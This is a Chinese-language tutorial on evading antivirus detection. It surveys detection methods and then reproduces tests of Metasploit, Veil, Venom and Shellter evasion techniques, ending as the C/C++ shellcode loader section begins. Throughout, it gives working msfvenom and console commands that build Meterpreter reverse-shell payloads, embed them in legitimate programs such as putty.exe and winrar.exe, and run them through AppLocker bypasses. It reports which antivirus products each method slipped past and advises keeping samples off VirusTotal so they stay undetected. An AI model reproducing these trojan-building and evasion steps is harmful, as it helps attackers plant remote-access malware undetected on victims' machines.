静态检测\n\n静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。\n\n静态检测针对样本文件在硬盘上的状态进行检测：\n\n- 样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。\n- 特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。\n- 黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。\n\n通常静态检测会识别代码中存在的函数：\n\n- Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。\n- 编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(\"cmd /c\")\n\n常见的绕过思路：\n\n- 绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加/替换资源、加密Shellcode等\n\n常用的静态检测平台：\n\n- https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。\n\n### 动态检测\n\n动态检测针对样本文件内存中的状态进行检测：\n\n- 内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。\n- 敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。\n- 敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：\n  - 注册表操作：添加启动项、添加服务。\n  - 文件操作：写入文件、读取系统文件、删除文件、移动文件。\n  - 进程操作：杀死进程、创建进程。\n  - 用户操作：添加用户、删除用户、删除用户。\n  - 其他操作：注入、劫持等。\n\n常见的绕过思路：\n\n- 绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容\n\n常用的动态检测平台：\n\n- https://s.threatbook.cn/\n\n### 流量检测\n\n流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：\n\n- 结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。\n- 内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。\n- IP/域名/证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。\n\n常见的绕过思路：\n\n- 绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等\n\n### 云查杀\n\n云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。\n\n当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。\n\n## 免杀原理\n\n### 静态免杀\n\n#### 修改特征码\n\n特征码是能够识别一个程序的不大于64字节的字符。\n\n修改特征码是在不改变程序运行效果的前提下，更改其特征码。\n\n修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。\n\n#### 花指令免杀\n\n花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。\n\n为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。\n\n#### 加壳免杀\n\n软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。\n\n加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。\n\n可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。\n\n加壳工具：\n\n- ASPack\n- UPX\n\n### 动态免杀\n\n#### API免杀\n\n- 替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如`MoveFileEx`替换`MoveFile`。\n\n- 重写API：逆向后完全重写系统API功能，实现对应功能的API。\n\n- 底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。\n\n#### 内存免杀\n\n在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。\n\n#### 二次编译\n\nMetasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。\n\nShikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。\n\n目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。\n\n#### 分离免杀\n\n例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。\n\n#### 资源修改\n\n有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。\n\n- 添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等\n- 替换资源：使用ResHacker替换无用的资源，例如版本等\n- 添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件\n\n# 免杀技术研究\n\n## Bypass一览表（2020年）\n\n![](./images/202205261702163.png)\n\n![](./images/202205261701678.png)\n\n## Bypass一览表（2022年）\n\nVirusTotal对应杀软及名称：\n\n- 卡巴：Kaspersky\n- 微软：Microsoft\n- 瑞星：Rising\n- 金山：Kingsoft\n- 江民：Jiangmin\n- 趋势：TrendMicro\n\n| 序号 | 免杀方法            | 2020年VT | 2022年VT | 360  | QQ   | 火绒 | 卡巴 | McAfee | 微软 | Symantec | 瑞星 | 金山 | 江民 | 趋势 |\n| ---- | ------------------- | -------- | -------- | ---- | ---- | ---- | ---- | ------ | ---- | -------- | ---- | ---- | ---- | ---- |\n| 1    | 未免杀处理          | 53/69    | 51/69    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 2    | msf自编码           | 51/69    | 48/67    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 3    | msf自捆绑           | 39/69    | 15/69    |      | √    | √    | √    |        | √    | √        |      | √    | √    | √    |\n| 4    | msf捆绑+编码        | 35/68    | 16/69    |      | √    | √    | √    |        | √    | √        |      | √    | √    | √    |\n| 5    | msf多重编码         | 45/70    | 28/67    |      | √    | √    |      | √      | √    | √        |      | √    | √    | √    |\n| 6    | Evasion模块exe      | 42/71    | 43/69    |      | √    |      |      |        |      |          |      | √    | √    | √    |\n| 7    | Evasion模块hta      | 14/59    | （None） |      |      |      |      |        |      |          |      |      |      |      |\n| 8    | Evasion模块csc      | 12/71    | 33/69    |      | √    |      | √    |        |      | √        |      | √    | √    | √    |\n| 9    | Veil原生exe         | 44/71    | 44/69    |      |      |      |      |        |      |          |      | √    |      | √    |\n| 10   | Veil+gcc编译        | 23/71    | 11/69    |      | √    |      | √    | √      | √    | √        | √    | √    | √    | √    |\n| 11   | Venom生成exe        | 19/71    | 35/68    |      | √    |      |      |        | √    |          |      | √    |      | √    |\n| 12   | Venom生成dll        | 11/71    | （None） |      |      |      |      |        |      |          |      |      |      |      |\n| 13   | Shellter生成exe     | 7/69     | 12/65    |      | √    |      | √    | √      |      | √        | √    | √    | √    | √    |\n| 14   | msf生成exe          | -        | 51/69    |      |      |      |      |        |      |          |      | √    | √    |      |\n| 15   | C/C++2：动态内存    | 24/71    | 36/69    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 16   | C/C++3：嵌入汇编    | 12/71    | 36/69    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 17   | C/C++4：强制转换    | 9/70     | 34/68    |      | √    |      |      |        |      |          |      | √    |      | √    |\n| 18   | C/C++5：汇编花指令  | 12/69    | 37/69    | √    | √    |      |      |        |      |          |      | √    |      | √    |\n| 19   | C/C++6：XOR加密     | 15/71    | 21/69    |      | √    |      |      |        | √    |          |      | √    |      | √    |\n| 20   | C/C++7：base64加密1 | 28/69    | 21/68    | √    | √    |      | √    |        | √    |          |      | √    | √    | √    |\n| 21   | C/C++8：base64加密2 | 28/69    | 17/67    | √    | √    |      | √    |        | √    |          |      | √    | √    | √    |\n\n## 复现环境（2022年）\n\n时间：2022.05\n\n攻击机：192.168.174.128\n\n免杀方法：\n\n- 此处仅介绍msf、Evasion、Veil、Venom、C/C++ Shellcode，其余方法参见原po：https://github.com/TideSec/BypassAntiVirus\n\n原po各杀软版本：\n\n- 360杀毒版本5.0.0.8160(2019.12.12)\n- 火绒版本5.0.33.13(2019.12.12)\n- 360安全卫士12.0.0.2001(2019.12.17)\n\n本文各杀软版本：\n\n- 火绒版本5.0.68.2(2022.05.26)\n- 360安全卫士13.0.0.2003(2022.05.26)\n\n测试平台：\n\n- Virustotal，以下简称VT。VT查杀率代表静态查杀能力。\n\n【注意】\n\n- 如果是自己做免杀，建议测试机不要连互联网，更不要上传到virustotal.com类似的平台上。\n\n- 不要上传！\n- 不要上传！\n- 不要上传！\n- 上传一次以后，你自己辛辛苦苦写的免杀可能就不再免杀了。\n\n## Metasploit自带免杀\n\nPayload均使用MSF的windows/meterperter/reverse_tcp模块生成。\n\n攻击机MSF监听6666端口：\n\n```\nmsf6 > use exploits/multi/handler\nmsf6 exploit(multi/handler) > set LHOST 192.168.174.128\nmsf6 exploit(multi/handler) > set LPORT 6666\nmsf6 exploit(multi/handler) > run\n```\n\n### 原生态payload(VT查杀率51/69)\n\nMSF生成原始payload：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -f exe -o /mnt/hgfs/Share/payload1.exe\n```\n\n![image-20220526190423066](./images/202205261904148.png)\n\n360和火绒都能查杀。\n\n在virustotal.com上查杀率为51/69（原po为53/69）。\n\n360：\n\n![image-20220526190107987](./images/202205261901055.png)\n\n火绒：\n\n![image-20220526190513816](./images/202205261905876.png)\n\nVT查杀成功：\n\n![image-20220526190921570](./images/202205261909679.png)\n\nVT查杀失败：\n\n![image-20220526190959477](./images/202205261909529.png)\n\n### msf自编码免杀(VT查杀率48/67)\n\n使用`msfvenom --list encoders`可查看所有编码器。\n\n评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器。\n\n使用`x86/shikata_ga_nai`生成payload，参数`-i`为编码次数，使用`-b`参数去掉payload中的空字符：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -b \"\\x00\" -i 15  -f exe -o /mnt/hgfs/Share/payload2.exe\n```\n\n![image-20220526191328018](./images/202205261913186.png)\n\n由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不一样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有一定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。\n\n360和火绒都能查杀。\n\n在virustotal.com上查杀率为48/67（原po为51/69）。\n\n360：\n\n![image-20220526191412121](./images/202205261914178.png)\n\n火绒：\n\n![image-20220526191549429](./images/202205261915497.png)\n\nVT查杀成功：\n\n![image-20220526191847382](./images/202205261918483.png)\n\nVT查杀失败：\n\n![image-20220526191857605](./images/202205261918665.png)\n\n### msf自捆绑免杀(VT查杀率15/69)\n\n在生成payload时可以使用捆绑功能，使用msfvenom的`-x`参数可以指定一个自定义的可执行文件作为模板,并将payload嵌入其中，`-x`后面跟对应文件路径就可以。\n\n这里使用一个正规的`putty.exe`作为被捆绑测试软件。\n\n生成payload命令如下：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666  -x putty.exe  -f exe -o /mnt/hgfs/Share/payload3.exe\n```\n\n![image-20220526192124189](./images/202205261921270.png)\n\n生成的两个文件对比，大小完全一样。能否免杀也和被捆绑exe有一定关系，可以选微软的一些工具作为模板exe程序。\n\n![image-20220526192251559](./images/202205261922615.png)\n\n360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒也能查杀）。\n\n在virustotal.com上查杀率为15/69（原po为39/69）。\n\n360：\n\n![image-20220526192548112](./images/202205261925172.png)\n\nVT：\n\n![image-20220526193243216](./images/202205261932310.png)\n\n\n\n### msf自捆绑+编码(VT查杀率16/69)\n\n将上面的编码和捆绑两种方法结合一下进行尝试：\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=6666 -e x86/shikata_ga_nai -x putty.exe  -i 15 -f exe -o /mnt/hgfs/Share/payload4.exe\n```\n\n![image-20220526193359812](./images/202205261933974.png)\n\n与上一种方法对比，大小完全一样。\n\n![image-20220526193552798](./images/202205261935858.png)\n\n可修改-i编码次数，编码次数越多，生成的payload越可能免杀，经测试，编码5次和6次可免杀360。\n\n360能查杀，火绒不能查杀。但是识别时间比前两种方法久一些（原po火绒动态静态均能查杀，而360不会报毒）。\n\n在virustotal.com上查杀率为16/69（原po为35/69）。\n\n360：\n\n![image-20220526194032466](./images/202205261940527.png)\n\nVT：\n\n![image-20220526193813109](./images/202205261938216.png)\n\n### msfvenom多重编码(VT查杀率28/67)\n\nmsfvenom的encoder编码器可以对payload进行一定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。\n\n如下命令，使用管道让`msfvenom`对攻击载荷多重编码，先用`shikata_ga_nai`编码20次，接着来10次的`alpha_upper`编码，再来10次的`countdown`编码，最后才生成以`putty.exe`为模板的可执行文件。\n\n```\nmsfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=192.168.174.128 LPORT=6666 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o /mnt/hgfs/Share/payload5.exe\n```\n\n如果报错`Error: You must select an arch for a custom payload`，则添加参数：\n\n```\n-a x86 --platform windows\n```\n\n![image-20220526194938055](./images/202205261949206.png)\n\n还有更多重编码姿势：\n\n```\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.74.133 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b \"&\" -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe > payload6.exe\n```\n\n经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。\n\n360可以查杀，火绒不能查杀。\n\n在virustotal.com上查杀率为28/67（原po为45/70），Bypass了McAfee。\n\n360：\n\n![image-20220526195103114](./images/202205261951182.png)\n\nVT：\n\n![image-20220526195652390](./images/202205261956521.png)\n\n\n\n## Metasploit Evasion免杀\n\n2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。evasion有以下几个模块,可以使用`show evasion`进行查看。\n\nmsf6 evasion模块：\n\n![image-20220527084747663](./images/202205270847820.png)\n\n### 生成exe(VT查杀率43/69)\n\n使用`use windows/windows_defender_exe`进行生成payload\n\n```\nmsf6 > use windows/windows_defender_exe\nmsf6 evasion(windows/windows_defender_exe) > set filename payload.exe\nmsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128\nmsf6 evasion(windows/windows_defender_exe) > set LPORT 6666\nmsf6 evasion(windows/windows_defender_exe) > run\n```\n\n![image-20220527085549361](./images/202205270855472.png)\n\n不打开杀软的情况下，可正常上线：\n\n```\nhandler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp\n```\n\n打开杀软，360和火绒都能查杀。\n\n在virustotal.com上查杀率为43/69（原po为42/71）。\n\n360：\n\n![image-20220527085842405](./images/202205270858477.png)\n\n火绒：\n\n![image-20220527085747182](./images/202205270857265.png)\n\nVT：\n\n![image-20220527090002712](./images/202205270900839.png)\n\n### 生成hta(VT查杀率14/59)\n\n用另外一个evasion模块`windows/windows_defender_js_hta`生成一下，360同样被杀。\n\n```\nmsf6 > use windows/windows_defender_js_hta\nmsf6 evasion(windows/windows_defender_exe) > set filename payload1.exe\nmsf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.174.128\nmsf6 evasion(windows/windows_defender_exe) > set LPORT 6666\nmsf6 evasion(windows/windows_defender_exe) > run\n```\n\n但是火绒静态+行为查杀都没发现问题，可正常上线。\n\n在virustotal.com上查杀率为14/59。不过在线查毒时显示360也没查出来，但本地测试时却是能查出来的，所以在线查杀还是不太精准的。\n\n复现时该模块生成的可执行无法运行。\n\n### 生成install_util(VT查杀率33/69)\n\nevasion还提供了其他几个模块，比如`windows/applocker_evasion_install_util`\n\n创建payload\n\n```\nmsf6 > use windows/applocker_evasion_install_util\nmsf6 evasion(windows/applocker_evasion_install_util) > set payload windows/meterpreter/reverse_tcp\nmsf6 evasion(windows/applocker_evasion_install_util) > set lhost 192.168.174.128\nmsf6 evasion(windows/applocker_evasion_install_util) > set lport 6666\nmsf6 evasion(windows/applocker_evasion_install_util) > run\n\n[+] install_util.txt stored at /Users/xysoul/.msf4/local/install_util.txt\n[*] Copy install_util.txt to the target\n[*] Compile using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\csc.exe /out:install_util.exe install_util.txt\n[*] Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe\n```\n\n根据说明，需要使用csc.exe进行编译一下，然后用`InstallUtil.exe`加载文件。\n\ncsc.exe是微软.NET Framework 中的C#语言编译器，本机安装了.net后就可以找到该文件。用vs2017里的csc.exe进行编译，生成install_util.exe。\n\n```\n> C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\csc.exe /out:install_util.exe install_util.txt\n```\n\n![image-20220527092742869](./images/202205270927923.png)\n\n直接执行`install_util.exe`，无法上线，并且360查杀报毒。\n\n根据说明，需要使用`InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe`来加载，才能成功上线。\n\n```\n> C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U install_util.exe\n```\n\n注意的是，如果生成的是32位的payload，就要用32位的.net下的InstallUtil来加载，否则文件会无法执行。\n\n![image-20220527093115067](./images/202205270931141.png)\n\n360和火绒都能查杀（原po静态查杀都没有问题，执行时360行为查杀会报毒）。\n\n在virustotal.com上查杀率为33/69（原po为12/71）。\n\n360：\n\n![image-20220527093207774](./images/202205270932856.png)\n\n\n\n火绒：\n\n![image-20220527093508879](./images/202205270935961.png)\n\nVT：\n\n![image-20220527093615742](./images/202205270936872.png)\n\n## Veil免杀\n\nVeil、Venom和Shellter是三大老牌免杀工具。\n\nVeil-Evasion是一个用python写的免杀框架，可以将任意脚本或一段shellcode转换成Windows可执行文件，还能利用Metasploit框架生成相兼容的Payload工具，从而逃避了常见防病毒产品的检测。\n\n### 安装Veil\n\n推荐Docker方式进行安装。镜像地址：\n\n```\nhttps://hub.docker.com/r/mattiasohlsson/veil/\n```\n\n拉取veil镜像：\n\n```\ndocker pull mattiasohlsson/veil\n```\n\n拉取成功后，执行：\n\n```\ndocker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil\n```\n\n`-v /tmp/veil-output:/var/lib/veil/output:Z`是将宿主机的`/tmp/veil-output`目录映射到docker里面，这样veil生成的payload可以直接在宿主机里使用。\n\n之后再进入镜像可以在启动镜像后使用下面命令：\n\n```\ndocker exec -it <container id> /bin/bash\n```\n\n执行`veil`命令可启动,版本为3.1.1。\n\nveil有两个免杀的工具，Evasion和Ordnance。Ordnance可生成在Veil-Evasion中使用的shellcode，Evasion是用做文件免杀。一般选择Evasion。\n\n```\nVeil>: use 1                   #选择Evasion功能\nVeil/Evasion>: list            #查看payload列表\n```\n\n使用`list`可以看到到41种stager。\n\n![image-20220527094613602](./images/202205270946813.png)\n\n推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。\n\nveil原理可以参考：https://xz.aliyun.com/t/4191\n\n### 使用veil直接生成exe(VT查杀率44/69)\n\nveil可以直接生成支持msf的payload，我们先试一下看看效果。\n\n使用go语言生成msf的payload\n\n```\nVeil/Evasion>: use 16\n```\n\n设置好msf的监听主机和端口：\n\n```\n[go/meterpreter/rev_tcp>>]: set lhost 192.168.174.128\n[go/meterpreter/rev_tcp>>]: set lport 6666\n[go/meterpreter/rev_tcp>>]: generate\n```\n\n![image-20220527095925448](./images/202205270959676.png)\n\n设定好生成的payload的名称，例如payload1：\n\n![image-20220527094916300](./images/202205270950182.png)\n\n一系列编码编译之后，就生成payload了：\n\n![image-20220527095021088](./images/202205270950223.png)\n\n因为之前已经做过Docker目录映射，所以在宿主机的`/tmp/veil-output/compiled/`目录可直接看到生成的exe文件。\n\n在msf中监听：\n\n```\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lhost 192.168.174.128\nmsf6 exploit(multi/handler) > set lport 6666\nmsf6 exploit(multi/handler) > exploit\n```\n\n在测试主机执行`payload1.exe`，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。\n\n在virustotal.com上查杀率为44/69（原po为44/71）。\n\n360：\n\n![image-20220527100249086](./images/202205271002159.png)\n\n火绒：\n\n![image-20220527101107223](./images/202205271011302.png)\n\nVT：\n\n![image-20220527101335024](./images/202205271013133.png)\n\n### 使用veil+mingw-w64(VT查杀率11/69)\n\n先用veil生成shellcode\n\n```\n# veil\nVeil> use 1\t\t\t\t\t\t\t\t# 选择使用 Veil-Evasion 模块\nVeil/Evasion> use 7\t\t\t\t\t\t# 选择payload  c/meterpreter/rev_tcp.py\n[cs/meterpreter/rev_tcp>>] set LHOST 192.168.174.128\n[cs/meterpreter/rev_tcp>>] set LPORT 6666\n[cs/meterpreter/rev_tcp>>] generate\n```\n\n![image-20220527101615402](./images/202205271016580.png)\n\n输入生成文件名为`c_msf`：\n\n![image-20220527101633513](./images/202205271016611.png)\n\n先生成一个可以被 msf 利用的 `c_msf.c` 然后用mingw-w64 来编译。\n\nmingw-w64的安装可参考：https://zhuanlan.zhihu.com/p/76613134\n\n若编译报错，可以尝试指定库，生成可执行文件a.exe：\n\n```\ngcc c_msf.c -lws2_32\n```\n\n![image-20220527112104971](./images/202205271121046.png)\n\n360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。\n\n在virustotal.com上查杀率为11/69（原po为23/71）。Bypass了McAfee。\n\n360：\n\n![image-20220527112426483](./images/202205271124553.png)\n\n火绒：\n\n![image-20220527112257096](./images/202205271122178.png)\n\nVT：\n\n![image-20220527112633347](./images/202205271126466.png)\n\n## Venom免杀\n\nVenom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。\n\nVenom的一些功能还会直接调用`Veil-Evasion.py`，`unicorn.py`，`powersploit.py`等来直接创建免杀程序，避免重复造轮子。\n\n### 安装Venom\n\nvenom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。\n\n```\nZenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)\nmingw32 (compiler) | pyherion.py (crypter) | wine (emulator)\nPEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)\nvbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)\nettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)\n```\n\n从github上拖到本地\n\n```\ngit clone https://github.com/r00t-3xp10it/venom.git\n```\n\n修改文件执行权限\n\n```\ncd venom\nsudo chmod -R +x *.sh\nsudo chmod -R +x *.py\n```\n\n安装依赖库和软件\n\n```\ncd aux\nsudo ./setup.sh\n```\n\n运行venom，代码高亮有些问题，但是问题不大，还是可以用的\n\n```\nsudo ./venom.sh\n```\n\n![image-20220527173623380](./images/202205271736471.png)\n\n### venom生成exe(VT查杀率35/68)\n\n启动venom:`sudo ./venom.sh`，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。\n\n![image-20220527173757520](./images/202205271737599.png)\n\n支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。\n\n先生成一个最简单直接的，第4个模块，通过C编译EXE程序。\n\n在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：\n\n![image-20220527173929002](./images/202205271739076.png)\n\n然后输入端口号之后，选择payload，选择最常规的`windows/meterperter/reverse_tcp`。\n\n输入一个文件名，例如notepad。\n\n![image-20220527174056207](./images/202205271740284.png)\n\n然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。\n\n之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。\n\n![image-20220527174259258](./images/202205271742310.png)\n\n360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。\n\n在virustotal.com上查杀率为35/68（原po为19/71）。\n\n360：\n\n![image-20220527180055539](./images/202205271800602.png)\n\n火绒：\n\n![image-20220527180138530](./images/202205271801624.png)\n\nVT：\n\n![image-20220527180452891](./images/202205271804004.png)\n\n### venom生成dll(VT查杀率11/70)\n\n选择windows之后，在agent中选择第1个，生成dll。\n\n![image-20220527180740091](./images/202205271807146.png)\n\n后面的操作和上面那个差不多，然后就能看到生成了`notepad.dll`文件。\n\n原po将文件拷贝到测试机上，命令行中执行`rundll32.exe notepad.dll,main`，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11/71。\n\n本文复现时出现问题：\n\n![image-20220527181539179](./images/202205271815246.png)\n\n## Shellter免杀\n\n注意：\n\n- shellter目前只能注入32位的可执行文件\n- shellter需要管理员权限运行\n\n### 安装Shellter\n\nubuntu系统中apt安装：\n\n```\napt-get update\napt-get install shellter\ndpkg --add-architecture i386 && apt-get update && apt-get install wine32\n```\n\nkali中不是很好用，windows中手动下载手动下载：\n\n官方下载站点`https://www.shellterproject.com/download/`，下载后解压，无需安装，cmd下可直接使用。\n\n![image-20220527182416161](./images/202205271824223.png)\n\n### 生成payload（VT免杀率7/69)\n\n需要提前准备一个PE文件作为被注入程序。用之前选的`putty.exe`来进行测试。\n\n必须使用32位PE文件，下载一个32位putty.exe：\n\n![image-20220527182755237](./images/202205271827287.png)\n\n之后程序会把`putty.exe`进行备份，因为生成的payload会自动覆盖原来的`putty.exe`。\n\n但`putty-32.exe`生成报错，换了一个32位可执行文件`winrar.exe`：\n\n![image-20220527185054107](./images/202205271850186.png)\n\n选项`Enable Stealth Mode`，是否启用隐身模式，启用后免杀效果会变差，建议不启用。\n\n还是选择`windows/meterpreter/reverse_tcp`作为payload\n\n![image-20220527185214043](./images/202205271852105.png)\n\n全程自动化生成，最终的生成文件会替换原来的`winrar.exe`。\n\n通过对比可发现程序稍微变大了\n\n在msf中使用`handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp`进行监听\n\n360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。\n\n在virustotal.com上查杀率为12/65，Bypass了卡巴、瑞星（原po为7/69，卡巴、瑞星、微软三个都没bypass）。\n\n360：\n\n![image-20220527185452045](./images/202205271854112.png)\n\n火绒：\n\n![](./images/202205271856578.png)\n\nVT：\n\n![image-20220527190242985](./images/202205271902073.png)\n\n## C、C++加载shellcode\n\n以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C/C++、C#和python。\n\nC/C++加载shellcode手工编译的方法，一般分为两种方式：\n\n1. C/C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。\n\n2. 使用加载器加载C/C++代码，如shellcode_launcher之类。\n\n### 方法1 